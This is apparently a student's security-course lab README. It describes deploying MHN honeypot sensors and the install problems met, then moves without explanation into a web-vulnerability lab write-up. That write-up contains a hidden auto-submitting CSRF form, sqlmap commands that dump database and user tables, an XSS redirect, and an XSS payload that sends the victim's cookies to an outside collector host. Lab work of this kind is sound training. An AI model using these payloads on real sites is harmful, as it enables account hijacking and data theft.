# Project 9 - Honeypot

Time spent: **10** hours spent in total

> Objective: Setup a honeypot and intercept some attempted attacks in the wild.

## Honeypots Deployed

### Dionaea Sensor
* Dionaea is "meant to be a nepenthes successor, embedding python as scripting language, using libemu to detect shellcodes, supporting ipv6 and tls."

### Conpot Sensor
* Conpot is a "low interactive server side Industrial Control Systems honeypot designed to be easy to deploy, modify and extend."

### Snort Sensor
* Snort is an "open source intrusion prevention system capable of real-time traffic analysis and packet logging."

### Suricata Sensor
* Suricata is "capable of real time intrusion detection (IDS), inline intrusion prevention (IPS), network security monitoring (NSM) and offline pcap processing."

### Kippo Sensor
* Kippo is a medium-interaction SSH honeypot written in Python. Kippo is used to log brute force attacks and the entire shell interaction performed by an attacker.

## Issues Encountered

I encountered issues installing the mhn into my VM at first due to a required site being down (httpbin.org), however that was later remedied when the github repo with the installation was updated.

I also ran into trouble installing the honeypot 'Cowrie', as the installation could not complete due to an error stating that 'setuptools' was not up-to-date and needed version 18.5 or higher. This error is a bug, since 'setuptools' on the VM was version 39. Despite that I recreated the VM, installed the 'setuptools' at version 18.5, and still the same error appeared. I gave up on the installation and instead installed the previous iteration of the honeypot - 'Kippo'.

The same error also appeared for 'Glastopf' where 'setuptools' was not up-to-date.

## Summary of Data

Vulnerability #1: Insecure Direct Object Reference (IDOR)
* By changing the value of "id" in the URL, a visitor is able to view pages/information that was meant to be private

<img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/idor.gif">

Vulnerability #2: Cross-Site Request Forgery (CSRF)
* Forged a form using the code below. Then allowed a logged-in user to visit the page, resulting in a CSRF POST request attack

```
<html>
  <head>
  </head>
  <body>
  	<h1><center>Totally Normal Site</center></h1>
    	<form name="csrfForm" action="https://35.184.21.59/red/public/staff/salespeople/edit.php?id=1" 
	method="post" target="hide">

		<input type="hidden" name="first_name" value="Site Hacked">
		<input type="hidden" name="last_name" value="By Brian">
	</form>
	<iframe name="hide" style="display: none;"></iframe>
	<script>
 		document.csrfForm.submit();
	</script>
  </body>
</html>
```

<img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/csrf.gif">

## Bonus Objectives

Bonus Objective 1: Build on Objective #3 (SQL Injection). Experiment to see what other kinds of information you can get the database to reveal.
* Using the tool sqlmap, additional information is extracted using the following prompts: 
* ```sqlmap -u https://35.184.21.59/blue/public/salesperson.php?id=1 --no-cast --dbs```
* ```sqlmap -u https://35.184.21.59/blue/public/salesperson.php?id=1 --no-cast --tables -D globitek_blue```
* ```sqlmap -u https://35.184.21.59/blue/public/salesperson.php?id=1 --no-cast --dump -T salespeople,users -D globitek_blue```

<img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/bonus1.gif">

Bonus Objective 2: Build on Objective #4 (Cross-Site Scripting). Experiment to see if you can use XSS to: a) direct the user to a new URL, b) read cookie data, c) set cookie data.
* Inject the script ```<script>document.location = "https://google.com";</script>``` into feedback form. When a logged in user checks the feedback, the script will redirect them to https://google.com

<img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/bonus2a.gif">

* We can also steal cookie data using ```<script>document.write('<img src="https://yourserver.com/collect.gif?cookie=' + document.cookie + '" />')</script>``` which will cause the logged in user to send their cookie to your target website
* It is also possible to set up a CSRF page to set someone's cookie data and using XSS redirect that user to the page

## Notes
